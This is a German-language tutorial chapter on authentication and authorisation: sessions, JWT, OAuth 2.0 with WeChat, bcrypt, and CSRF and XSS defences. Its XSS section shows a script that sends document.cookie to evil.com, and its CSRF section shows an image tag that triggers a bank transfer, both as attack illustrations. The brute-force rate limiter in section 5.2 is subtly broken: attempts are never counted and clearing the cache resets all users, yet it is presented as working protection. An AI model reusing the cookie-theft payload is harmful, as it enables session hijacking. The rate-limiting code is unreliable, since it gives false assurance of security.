# Authentifizierung und Autorisierung: Prinzipien
> 💡 **Lernleitfaden**: Dieses Kapitel führt dich tief in das "Zugangskontrollsystem" des Backends ein – Authentifizierung und Autorisierung. Wir beginnen mit der grundlegendsten Frage "Wer bist du?" und arbeiten uns Schritt für Schritt durch moderne Authentifizierungslösungen wie Session, JWT und OAuth 2.0.

<AuthEvolutionDemo />

## 0. Einleitung: Die "Zugangskontrolle" des Systems

Warum bist du bei WeChat nach dem Schließen und erneuten Öffnen immer noch eingeloggt?
Woher weiß Bilibili, ob du Premium-Mitglied oder normaler Benutzer bist?
Warum musst du kein Passwort eingeben, wenn du dich mit deinem WeChat-QR-Code bei einer Drittanbieter-Website anmeldest?

Hinter all dem steckt ein zentrales System: **Authentifizierung & Autorisierung (Authentication & Authorization)**.

Stell dir das Backend-System wie ein großes Gebäude vor:

- **Authentifizierung (Authentication)**: Bestätigt "Wer bist du?" (Ausweis/Zugangskarte überprüfen).
- **Autorisierung (Authorization)**: Bestätigt "Wohin darfst du gehen?" (VIPs dürfen in die VIP-Lounge, normale Benutzer nicht).

### 0.1 Warum Authentifizierung

Es gibt nur einen Grund: **Ressourcen schützen**.

- **Datenschutz**: Deine persönlichen Daten und Chat-Verläufe kannst nur du sehen.
- **Berechtigungskontrolle**: Administratoren können Benutzer löschen, normale Benutzer nicht.
- **Missbrauchsprävention**: Verhindert böswillige Aufrufe und API-Missbrauch.

<AuthBasicsDemo />

### 0.2 Interaktive Demo: Login-Prozess

Lass uns anhand einer realistischen Login-Demo verstehen, wie Authentifizierung und Autorisierung funktionieren.

<AuthInteractiveLoginDemo />

**Kernpunkt**: Authentifizierung ist die erste Verteidigungslinie. Alle sensiblen Operationen müssen zuerst die Identität überprüfen.

---

## 1. Grundkonzepte: Authentifizierung vs. Autorisierung

### 1.1 Authentifizierung (Authentication): Wer bist du

Bestätigt die Identität des Benutzers.

- _Beispiel_: Benutzername und Passwort eingeben, Fingerabdruck scannen, Gesichtserkennung.
- _Ausgabe_: Ein Token, das "dich" repräsentiert.
- _Englische Abkürzung_: **AuthN**

### 1.2 Autorisierung (Authorization): Berechtigungsfestlegung

Bestätigt, welche Berechtigungen ein Benutzer hat.

- _Beispiel_: Administratoren können Artikel löschen, normale Benutzer können nur liken.
- _Ausgabe_: Zugriff erlauben oder verweigern.
- _Englische Abkürzung_: **AuthZ**

### 1.3 Die Beziehung zwischen beiden

```
Benutzeranfrage → Authentifizierung (Wer bist du?) → Autorisierung (Darfst du das?) → Geschäftslogik ausführen
                   ↓                                    ↓
              Identität prüfen                    Berechtigungen prüfen
              (Token gültig?)                     (Hast du delete-Berechtigung?)
```

<AuthNvsAuthZDemo />

**Kernpunkt**: Erst authentifizieren, dann autorisieren. Nur wenn "Wer bist du?" bestätigt ist, kann "Was darfst du tun?" beurteilt werden.

---

## 2. Evolution der Lösungen

### 2.1 Erste Generation: HTTP Basic Authentication

Die älteste Lösung – Benutzername und Passwort werden direkt in den HTTP-Header gesetzt.

```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
                      (base64("username:password"))
```

- **Vorteile**: Einfach, wird von allen Browsern unterstützt.
- **Nachteile**:
  - Unsicher (Base64 ist dekodierbar, quasi Klartext).
  - Bei jeder Anfrage wird das Passwort mitgesendet (leicht abfangbar).
  - Kein aktives Ausloggen möglich (außer durch Schließen des Browsers).

**Fazit**: Nur für interne Testwerkzeuge geeignet, niemals in Produktion einsetzen.

### 2.2 Zweite Generation: Session + Cookie

Der Klassiker der Webentwicklung.

**Ablauf**:

```
1. Benutzer loggt sich ein (POST /login)
   → Server überprüft Benutzername und Passwort
   → Erstellt eine Session (im Server-Arbeitsspeicher oder Redis)
   → Gibt Set-Cookie: session_id=abc123 zurück

2. Nachfolgende Anfragen
   → Browser sendet automatisch Cookie: session_id=abc123 mit
   → Server sucht die Session anhand der session_id
   → Wenn gefunden, gilt "Du bist du"
```

**Codebeispiel**:

```python
# Backend (Python Flask)
from flask import session, request

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    # Benutzername und Passwort überprüfen
    user = db.authenticate(username, password)
    if user:
        # Session erstellen
        session["user_id"] = user.id
        session["role"] = user.role
        return {"status": "success"}
    else:
        return {"error": "Benutzername oder Passwort falsch"}, 401

@app.route("/api/admin/users")
def get_users():
    # Session prüfen
    if "user_id" not in session:
        return {"error": "Nicht eingeloggt"}, 401

    # Berechtigung prüfen
    if session.get("role") != "admin":
        return {"error": "Unzureichende Berechtigungen"}, 403

    # Geschäftslogik ausführen
    users = db.get_all_users()
    return {"users": users}
```

<SessionCookieDemo />

**Vorteile**:

- Einfach und intuitiv, leicht verständlich.
- Serverseitiges aktives Ausloggen möglich (Session löschen).

**Nachteile**:

- **Server ist zustandsbehaftet**: Sessions müssen gespeichert werden, mehrere Server benötigen gemeinsamen Speicher (z. B. Redis).
- **Cross-Domain schwierig**: Cookies sind standardmäßig nicht cross-domain-fähig (CORS-Problematik).
- **CSRF-Angriffe**: Bösartige Websites können deine Cookies missbrauchen.

**Fazit**: Geeignet für traditionelle Webanwendungen (Server-Side Rendering), ungeeignet für Mobile und moderne SPAs.

### 2.3 Dritte Generation: Token (JWT)

Der Mainstream-Ansatz für moderne Webanwendungen.

**Kernidee**: Kein serverseitiger Zustand – Benutzerinformationen werden verschlüsselt in einen Token verpackt und clientseitig gespeichert.

**JWT-Struktur**:

```
JWT = Header.Payload.Signature

Beispiel:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJhZG1pbiIsImV4cCI6MTYxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
 |--------------------------------| |-----------------------------------------------| |----------------------------|
           Header                           Payload                                      Signature
```

- **Header**: Algorithmus-Informationen (z. B. `{"alg": "HS256", "typ": "JWT"}`).
- **Payload**: Benutzerinformationen (z. B. `{"user_id": 123, "role": "admin", "exp": 1616239022}`).
- **Signature**: Signatur (manipulationssicher).

**Ablauf**:

```python
# 1. Benutzer-Login
@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password = request.json["password"]

    user = db.authenticate(username, password)
    if user:
        # JWT generieren
        token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "exp": datetime.now() + timedelta(hours=24)  # 24 Stunden gültig
            },
            SECRET_KEY,
            algorithm="HS256"
        )
        return {"token": token}
    else:
        return {"error": "Benutzername oder Passwort falsch"}, 401

# 2. Nachfolgende Anfragen
@app.route("/api/admin/users")
def get_users():
    # Token aus dem Header holen
    auth_header = request.headers.get("Authorization")
    if not auth_header or not auth_header.startswith("Bearer "):
        return {"error": "Kein Token vorhanden"}, 401

    token = auth_header.split(" ")[1]

    try:
        # Token verifizieren und parsen
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        return {"error": "Token abgelaufen"}, 401
    except jwt.InvalidTokenError:
        return {"error": "Token ungültig"}, 401

    # Berechtigung prüfen
    if payload.get("role") != "admin":
        return {"error": "Unzureichende Berechtigungen"}, 403

    # Geschäftslogik ausführen
    users = db.get_all_users()
    return {"users": users}
```

<JWTWorkflowDemo />

**Vorteile**:

- **Zustandslos**: Server speichert keine Sessions, einfach horizontal skalierbar.
- **Cross-Domain-freundlich**: Im Header platziert, nicht durch Cookie-Cross-Domain-Beschränkungen limitiert.
- **Mobile-freundlich**: Native Apps können es problemlos nutzen.
- **Informationsreich**: Der Payload kann Benutzerinformationen, Berechtigungen usw. speichern.

**Nachteile**:

- **Kein aktives Ausloggen**: Einmal ausgestellte Tokens bleiben bis zum Ablauf gültig (außer mit Blacklist).
- **Payload sichtbar**: Base64-kodiert, keine sensiblen Daten speichern (z. B. Passwörter).
- **Token zu groß**: Wird bei jeder Anfrage mitgesendet, mehrere hundert Bytes.

**Fazit**: Der Standardansatz für moderne Web- und Mobile-Anwendungen.

<SessionVsJWTDemo />

---

## 3. OAuth 2.0: Drittanbieter-Login

Du kennst diese Buttons sicher: "Mit WeChat anmelden", "Mit Google anmelden".

Das ist **OAuth 2.0**: ein **Autorisierungs**-Framework (keine Authentifizierung!).

### 3.1 Kernrollen

| Rolle                     | Beschreibung                          | Beispiel                 |
| :------------------------ | :------------------------------------ | :----------------------- |
| **Resource Owner**        | Ressourcenbesitzer (Benutzer)         | Du                       |
| **Client**                | Drittanbieter-Anwendung               | Eine Website             |
| **Authorization Server**  | Autorisierungsserver                  | WeChat, Google           |
| **Resource Server**       | Ressourcenserver                      | WeChat-Benutzerdaten-API |

### 3.2 Authorization Code Flow

Der sicherste Modus, geeignet für Backend-Server.

**Ablauf**:

```
1. Benutzer klickt auf "Mit WeChat anmelden"
   → Weiterleitung zur WeChat-Autorisierungsseite
   https://open.weixin.qq.com/connect/qrconnect?
     appid=APPID&
     redirect_uri=https://yourapp.com/callback&
     response_type=code&
     scope=snsapi_login&
     state=STATE

2. Benutzer scannt den QR-Code und stimmt der Autorisierung zu
   → WeChat leitet zurück zu deiner Website
   https://yourapp.com/callback?code=AUTHORIZATION_CODE&state=STATE

3. Dein Backend tauscht den code gegen ein access_token
   POST https://api.weixin.qq.com/sns/oauth2/access_token
   {
     "appid": "APPID",
     "secret": "SECRET",
     "code": "AUTHORIZATION_CODE",
     "grant_type": "authorization_code"
   }
   → Antwort: { "access_token": "...", "openid": "..." }

4. Mit access_token Benutzerinformationen abrufen
   GET https://api.weixin.qq.com/sns/userinfo?
     access_token=ACCESS_TOKEN&
     openid=OPENID
   → Antwort: { "nickname": "Zhang San", "headimgurl": "..." }
```

<OAuth2FlowDemo />

**Codebeispiel**:

```python
from flask import request, redirect

@app.route("/login/wechat")
def login_wechat():
    # 1. Zur WeChat-Autorisierungsseite weiterleiten
    auth_url = (
        "https://open.weixin.qq.com/connect/qrconnect"
        f"?appid={APPID}"
        f"&redirect_uri={urlencode(REDIRECT_URI)}"
        "&response_type=code"
        "&scope=snsapi_login"
        f"&state={generate_state()}"
    )
    return redirect(auth_url)

@app.route("/callback")
def wechat_callback():
    # 2. Code abrufen
    code = request.args.get("code")
    state = request.args.get("state")

    # State verifizieren (CSRF-Schutz)
    if not verify_state(state):
        return {"error": "Invalid state"}, 400

    # 3. Code gegen access_token tauschen
    token_resp = requests.post(
        "https://api.weixin.qq.com/sns/oauth2/access_token",
        params={
            "appid": APPID,
            "secret": SECRET,
            "code": code,
            "grant_type": "authorization_code"
        }
    ).json()

    access_token = token_resp["access_token"]
    openid = token_resp["openid"]

    # 4. Benutzerinformationen abrufen
    user_info = requests.get(
        "https://api.weixin.qq.com/sns/userinfo",
        params={
            "access_token": access_token,
            "openid": openid
        }
    ).json()

    # 5. Lokalen Benutzer erstellen oder aktualisieren
    user = db.get_or_create_user(
        openid=openid,
        nickname=user_info["nickname"],
        avatar=user_info["headimgurl"]
    )

    # 6. Eigenen System-JWT generieren
    token = jwt.encode(
        {"user_id": user.id, "exp": ...},
        SECRET_KEY
    )

    return {"token": token}
```

**Kernpunkte**:

- **code ist nur einmal verwendbar**: Nach Gebrauch sofort ungültig, schützt vor Abfangen.
- **state schützt vor CSRF**: Generiere einen zufälligen String, verifiziere ihn beim Callback, um gefälschte bösartige Websites zu verhindern.
- **redirect_uri muss übereinstimmen**: Vorab auf der WeChat Open Platform registrieren, um Redirect-Angriffe zu verhindern.

### 3.3 Weitere Modi

| Modus                                   | Anwendungsfall                              | Sicherheit        |
| :-------------------------------------- | :------------------------------------------ | :---------------- |
| **Authorization Code**                  | Backend-Server                              | ⭐⭐⭐⭐⭐        |
| **Implicit**                            | Reine Frontend-Anwendungen (SPA)            | ⭐⭐⭐ (nicht empfohlen) |
| **Resource Owner Password**             | Hochvertrauenswürdige Anwendungen (z. B. offizielle App) | ⭐⭐              |
| **Client Credentials**                  | Server-zu-Server-Kommunikation (ohne Benutzer) | ⭐⭐⭐⭐          |

<OAuth2ModesDemo />

---

## 4. Praxis: Ein vollständiges Authentifizierungssystem entwerfen

### 4.1 Anforderungsanalyse

- **Multi-Plattform-Unterstützung**: Web, iOS, Android.
- **Drittanbieter-Login**: WeChat, Google.
- **Berechtigungskontrolle**: Normaler Benutzer, VIP, Administrator.
- **Sicherheit**: Schutz vor Missbrauch, Hijacking und Replay-Angriffen.

### 4.2 Architekturdesign

```
┌─────────────┐
│   Client     │
└──────┬──────┘
       │
       ▼
┌─────────────────────────────────┐
│         API Gateway             │
│  - Rate Limiting                │
│  - Token Validation             │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│      Auth Service               │
│  - Registrierung, Login         │
│  - Token-Ausstellung & -Prüfung │
│  - OAuth 2.0-Integration        │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│    Business Services            │
│  - User Service                 │
│  - Order Service                │
│  - Payment Service              │
└─────────────────────────────────┘
```

### 4.3 Datenbankdesign

```sql
-- Benutzertabelle
CREATE TABLE users (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) UNIQUE NOT NULL,
    password_hash VARCHAR(255) NOT NULL,  -- bcrypt-Hash
    email VARCHAR(100) UNIQUE,
    role ENUM('user', 'vip', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_username (username),
    INDEX idx_email (email)
);

-- Tabelle für Drittanbieter-Login-Verknüpfungen
CREATE TABLE user_auth_providers (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL,
    provider ENUM('wechat', 'google', 'github') NOT NULL,
    provider_user_id VARCHAR(100) NOT NULL,  -- Benutzer-ID des Drittanbieters
    access_token TEXT,  -- verschlüsselt gespeichert
    refresh_token TEXT,
    expires_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    UNIQUE KEY uk_provider_provider_user_id (provider, provider_user_id),
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Token-Blacklist (für aktives Ausloggen)
CREATE TABLE token_blacklist (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    token_jti VARCHAR(100) UNIQUE NOT NULL,  -- JWT JTI (eindeutige Kennung)
    expired_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    INDEX idx_expired_at (expired_at)
);
```

<AuthDatabaseDemo />

### 4.4 Code-Implementierung

```python
# auth_service.py
import bcrypt
import jwt
from datetime import datetime, timedelta

SECRET_KEY = "your-secret-key-here"  # In Produktion Umgebungsvariable verwenden

class AuthService:
    def register(self, username: str, password: str, email: str = None):
        # 1. Prüfen, ob Benutzername bereits existiert
        if db.get_user_by_username(username):
            raise ValueError("Benutzername existiert bereits")

        # 2. Passwort hashen (bcrypt)
        password_hash = bcrypt.hashpw(
            password.encode('utf-8'),
            bcrypt.gensalt(rounds=12)
        ).decode('utf-8')

        # 3. Benutzer erstellen
        user = db.create_user(
            username=username,
            password_hash=password_hash,
            email=email
        )

        # 4. Tokens ausstellen
        return self._generate_tokens(user)

    def login(self, username: str, password: str):
        # 1. Benutzer abfragen
        user = db.get_user_by_username(username)
        if not user:
            raise ValueError("Benutzername oder Passwort falsch")

        # 2. Passwort überprüfen
        if not bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        ):
            raise ValueError("Benutzername oder Passwort falsch")

        # 3. Tokens ausstellen
        return self._generate_tokens(user)

    def _generate_tokens(self, user):
        now = datetime.now()

        # Access Token (kurzlebig, z. B. 1 Stunde)
        access_token = jwt.encode(
            {
                "user_id": user.id,
                "role": user.role,
                "type": "access",
                "iat": now,
                "exp": now + timedelta(hours=1),
                "jti": str(uuid4())  # eindeutige Kennung
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        # Refresh Token (langlebig, z. B. 30 Tage)
        refresh_token = jwt.encode(
            {
                "user_id": user.id,
                "type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=30),
                "jti": str(uuid4())
            },
            SECRET_KEY,
            algorithm="HS256"
        )

        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "token_type": "Bearer",
            "expires_in": 3600  # Ablaufzeit des access_token (Sekunden)
        }

    def refresh(self, refresh_token: str):
        try:
            payload = jwt.decode(refresh_token, SECRET_KEY, algorithms=["HS256"])
            if payload.get("type") != "refresh":
                raise ValueError("Invalid token type")

            user = db.get_user_by_id(payload["user_id"])
            return self._generate_tokens(user)
        except jwt.ExpiredSignatureError:
            raise ValueError("Refresh Token abgelaufen")
        except jwt.InvalidTokenError:
            raise ValueError("Refresh Token ungültig")

    def logout(self, token: str):
        # Token zur Blacklist hinzufügen
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        db.add_to_blacklist(
            jti=payload["jti"],
            expired_at=datetime.fromtimestamp(payload["exp"])
        )

    def verify_token(self, token: str):
        try:
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])

            # Prüfen, ob Token auf der Blacklist steht
            if db.is_token_blacklisted(payload["jti"]):
                raise ValueError("Token wurde ausgeloggt")

            return payload
        except jwt.ExpiredSignatureError:
            raise ValueError("Token abgelaufen")
        except jwt.InvalidTokenError:
            raise ValueError("Token ungültig")

# API-Dekorator
def require_auth(auth_service: AuthService):
    def decorator(f):
        def wrapper(*args, **kwargs):
            # Token aus dem Header holen
            auth_header = request.headers.get("Authorization")
            if not auth_header or not auth_header.startswith("Bearer "):
                return {"error": "Kein Token vorhanden"}, 401

            token = auth_header.split(" ")[1]

            try:
                # Token verifizieren
                payload = auth_service.verify_token(token)
                # Benutzerinformationen in den Request-Kontext einfügen
                request.user = payload
                return f(*args, **kwargs)
            except ValueError as e:
                return {"error": str(e)}, 401

        return wrapper
    return decorator

def require_role(*roles):
    def decorator(f):
        def wrapper(*args, **kwargs):
            if not hasattr(request, "user"):
                return {"error": "Nicht eingeloggt"}, 401

            if request.user["role"] not in roles:
                return {"error": "Unzureichende Berechtigungen"}, 403

            return f(*args, **kwargs)
        return wrapper
    return decorator

# Verwendungsbeispiel
@app.route("/api/admin/users", methods=["GET"])
@require_auth(auth_service)
@require_role("admin")
def get_users():
    users = db.get_all_users()
    return {"users": users}

@app.route("/api/user/profile", methods=["GET"])
@require_auth(auth_service)
def get_profile():
    user = db.get_user_by_id(request.user["user_id"])
    return {"user": user}

@app.route("/auth/refresh", methods=["POST"])
def refresh_token():
    refresh_token = request.json.get("refresh_token")
    try:
        tokens = auth_service.refresh(refresh_token)
        return tokens
    except ValueError as e:
        return {"error": str(e)}, 401
```

<CompleteAuthSystemDemo />

---

## 5. Sicherheits-Best Practices

### 5.1 Passwortspeicherung

**❌ Falsche Vorgehensweise**:

```python
# Klartextspeicherung (absolut tabu!)
db.save_password(username, password)

# MD5 / SHA1-Hash (nicht sicher genug, anfällig für Rainbow-Table-Angriffe)
hash = md5(password)
db.save_password(username, hash)
```

**✅ Richtige Vorgehensweise**:

```python
# bcrypt (adaptiver Hash, langsamer Hash schützt vor Brute-Force)
import bcrypt

password_hash = bcrypt.hashpw(
    password.encode('utf-8'),
    bcrypt.gensalt(rounds=12)  # Je höher rounds, desto sicherer, aber auch langsamer
)

# Verifizierung
if bcrypt.checkpw(password.encode('utf-8'), password_hash):
    # Passwort korrekt
```

**Warum bcrypt?**

- **Langsam**: Absichtlich langsam gestaltet (Millisekunden-Bereich), schützt vor Brute-Force.
- **Adaptiv**: rounds kann angepasst werden, wird mit stärkerer Hardware mitgezogen.
- **Gesalzen**: Eingebautes zufälliges Salt, schützt vor Rainbow Tables.

<PasswordHashingDemo />

### 5.2 Brute-Force-Schutz

- **Rate Limiting**: Dieselbe IP / derselbe Benutzername, maximal 5 Versuche pro Minute.
- **CAPTCHA**: Nach 3 Fehlversuchen CAPTCHA-Eingabe erforderlich.
- **Kontosperrung**: Nach 10 Fehlversuchen Konto für 30 Minuten sperren.

```python
from functools import lru_cache
import time

@lru_cache(maxsize=10000)
def get_login_attempts(identifier: str) -> tuple:
    """Gibt (Anzahl Versuche, Zeitpunkt des ersten Versuchs) zurück"""
    return (0, 0)

def check_rate_limit(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    now = time.time()

    # Nach 1 Minute zurücksetzen
    if now - first_attempt > 60:
        get_login_attempts.cache_clear()
        return True

    # Mehr als 5 Versuche, ablehnen
    if attempts >= 5:
        return False

    return True

def record_login_attempt(identifier: str):
    attempts, first_attempt = get_login_attempts(identifier)
    if attempts == 0:
        first_attempt = time.time()
    get_login_attempts.cache_clear()
    get_login_attempts(identifier)  # Neu cachen

@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]

    # Rate Limit prüfen
    if not check_rate_limit(username):
        return {"error": "Zu viele Versuche, bitte in 1 Minute erneut versuchen"}, 429

    password = request.json["password"]

    # Passwort überprüfen
    user = db.get_user_by_username(username)
    if user and bcrypt.checkpw(password.encode(), user.password_hash.encode()):
        # Login erfolgreich, Zähler zurücksetzen
        get_login_attempts.cache_clear()
        return {"token": generate_token(user)}
    else:
        # Login fehlgeschlagen, Versuch aufzeichnen
        record_login_attempt(username)
        return {"error": "Benutzername oder Passwort falsch"}, 401
```

### 5.3 CSRF-Schutz (Cross-Site Request Forgery)

**Angriffsszenario**:
Du bist bei der Bank-Website `bank.com` eingeloggt und besuchst dann die bösartige Website `evil.com`. Auf `evil.com` gibt es diesen Code:

```html
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

Dein Browser sendet die Bank-Cookies mit dieser Anfrage mit (Cross-Origin-Anfrage), wodurch Geld überwiesen wird.

**Abwehrmaßnahmen**:

1.  **CSRF Token**:
    - Server generiert einen zufälligen Token und platziert ihn im Formular.
    - Beim Absenden wird überprüft, ob der Token übereinstimmt.

```python
from flask import session

@app.route("/api/transfer", methods=["POST"])
def transfer():
    # CSRF Token verifizieren
    token = request.headers.get("X-CSRF-Token")
    if token != session.get("csrf_token"):
        return {"error": "CSRF Token ungültig"}, 403

    # Überweisung ausführen
    ...
```

2.  **SameSite Cookie**:
    - Setze das `SameSite`-Attribut des Cookies auf `Strict` oder `Lax`.

```python
# Flask-Beispiel
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # oder 'Strict'
    SESSION_COOKIE_SECURE=True      # nur HTTPS erlauben
)
```

3.  **JWT verwenden (keine Cookies)**:
    - JWT wird in `localStorage` gespeichert, wird nicht automatisch mitgesendet – natürlicher CSRF-Schutz.

<CSRFDefenseDemo />

### 5.4 XSS-Schutz (Cross-Site Scripting)

**Angriffsszenario**:
Ein bösartiger Benutzer gibt im Kommentarbereich ein:

```html
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

Wenn die Website diesen Inhalt direkt rendert, werden die Cookies anderer Benutzer gestohlen.

**Abwehrmaßnahmen**:

1.  **Output-Escaping**:
    - Wandle `<` in `&lt;` und `>` in `&gt;` um.

```python
import html

def render_comment(comment):
    # HTML escapen
    safe_comment = html.escape(comment)
    return f"<div class='comment'>{safe_comment}</div>"
```

2.  **Content Security Policy (CSP)**:
    - Setze HTTP-Header, um Script-Quellen einzuschränken.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

3.  **HttpOnly Cookie**:
    - Setze das `HttpOnly`-Attribut des Cookies, JavaScript kann es nicht lesen.

```python
app.config.update(
    SESSION_COOKIE_HTTPONLY=True
)
```

<XSSDefenseDemo />

---

## 6. Zusammenfassung & Lernpfad

Authentifizierung ist die "Grundfertigkeit" des Backends – wer sie beherrscht, kann sichere und zuverlässige Anwendungen bauen.

### 6.1 Kernwissenspunkte

| Wissenspunkt              | Wichtigkeit  | Schwierigkeit | Praxis-Häufigkeit |
| :------------------------ | :----------- | :------------ | :---------------- |
| **Session + Cookie**      | ⭐⭐⭐⭐     | Mittel        | Hoch              |
| **JWT**                   | ⭐⭐⭐⭐⭐   | Niedrig       | Sehr hoch         |
| **OAuth 2.0**             | ⭐⭐⭐⭐     | Hoch          | Hoch              |
| **Passwort-Hashing (bcrypt)** | ⭐⭐⭐⭐⭐ | Niedrig       | Sehr hoch         |
| **Rate Limiting & Brute-Force-Schutz** | ⭐⭐⭐⭐⭐ | Mittel | Sehr hoch     |
| **CSRF-Abwehr**           | ⭐⭐⭐⭐     | Mittel        | Mittel            |
| **XSS-Abwehr**            | ⭐⭐⭐⭐     | Niedrig       | Hoch              |

### 6.2 Lernpfad

1.  **Einstieg** (1–2 Tage):
    - Verstehe den Unterschied zwischen Authentifizierung und Autorisierung.
    - Beherrsche das Prinzip von Session + Cookie.
    - Implementiere eine einfache Login/Registrierungs-Funktion.

2.  **Fortgeschritten** (1 Woche):
    - Lerne das Prinzip und die Implementierung von JWT.
    - Implementiere ein JWT-basiertes Authentifizierungssystem.
    - Beherrsche Passwort-Hashing (bcrypt).

3.  **Praxis** (2–4 Wochen):
    - Integriere OAuth 2.0 (WeChat-, Google-Login).
    - Implementiere Rate Limiting und Brute-Force-Schutz.
    - Wehre gängige Angriffe wie CSRF und XSS ab.

4.  **Vertiefung** (fortlaufend):
    - Lerne RBAC (Role-Based Access Control).
    - Beschäftige dich mit SSO (Single Sign-On).
    - Erkunde Zero Trust Architecture.

### 6.3 Empfohlene Ressourcen

- **Standards**:
  - RFC 6749 (OAuth 2.0)
  - RFC 7519 (JWT)
- **Artikel**:
  - JWT.io: https://jwt.io/
  - OAuth 2.0 Simplified: https://oauth.net/2/
- **Werkzeuge**:
  - jwt.io (JWT Online-Debugger)
  - Postman (API-Testing)

---

## 7. Glossar

| Begriff           | Vollständiger Name                     | Erklärung                                                                                             |
| :---------------- | :------------------------------------- | :---------------------------------------------------------------------------------------------------- |
| **AuthN**         | Authentication                         | **Authentifizierung**. Bestätigt "Wer bist du?" (z. B. Identität durch Passworteingabe prüfen).       |
| **AuthZ**         | Authorization                          | **Autorisierung**. Bestätigt "Was darfst du tun?" (z. B. nur Administratoren dürfen löschen).         |
| **Session**       | -                                      | **Sitzung**. Serverseitig gespeicherte Benutzerzustandsinformationen.                                 |
| **Cookie**        | -                                      | **Cookie**. Kleine Datenmenge, die der Browser speichert und bei jeder Anfrage automatisch mitsendet. |
| **JWT**           | JSON Web Token                         | **JSON Web Token**. Ein zustandsloses Authentifizierungsverfahren mit Header, Payload und Signature.  |
| **OAuth 2.0**     | -                                      | **Open Authorization**. Standardisiertes Framework für Drittanbieter-Login (z. B. "Mit WeChat anmelden"). |
| **SSO**           | Single Sign-On                         | **Single Sign-On**. Einmal einloggen, auf mehrere Anwendungen zugreifen (z. B. Google-Konto für alle Google-Dienste). |
| **RBAC**          | Role-Based Access Control              | **Rollenbasierte Zugriffskontrolle**. Berechtigungen basierend auf Benutzerrollen (z. B. admin, user). |
| **CSRF**          | Cross-Site Request Forgery             | **Cross-Site Request Forgery**. Angreifer verleiten Benutzer dazu, bösartige Anfragen zu senden (z. B. Überweisung mit deinen Cookies). |
| **XSS**           | Cross-Site Scripting                   | **Cross-Site Scripting**. Angreifer injizieren bösartige Skripte in Webseiten (z. B. Cookie-Diebstahl). |
| **bcrypt**        | -                                      | **Passwort-Hashing-Algorithmus**. Ein langsamer Hash-Algorithmus, speziell für Passwortspeicherung, schützt vor Brute-Force. |
| **Access Token**  | -                                      | **Zugriffstoken**. Kurzlebiger Token für den API-Zugriff.                                             |
| **Refresh Token** | -                                      | **Aktualisierungstoken**. Langlebiger Token zum Erhalt neuer Access Tokens.                           |
| **Scope**         | -                                      | **Berechtigungsumfang**. OAuth 2.0-Konzept, das die vom Drittanbieter angeforderten Berechtigungen beschreibt (z. B. Benutzerdaten lesen). |
| **PKCE**          | Proof Key for Code Exchange            | **Proof Key for Code Exchange**. OAuth 2.0-Erweiterung zur Sicherheitsverbesserung für öffentliche Clients (z. B. SPAs). |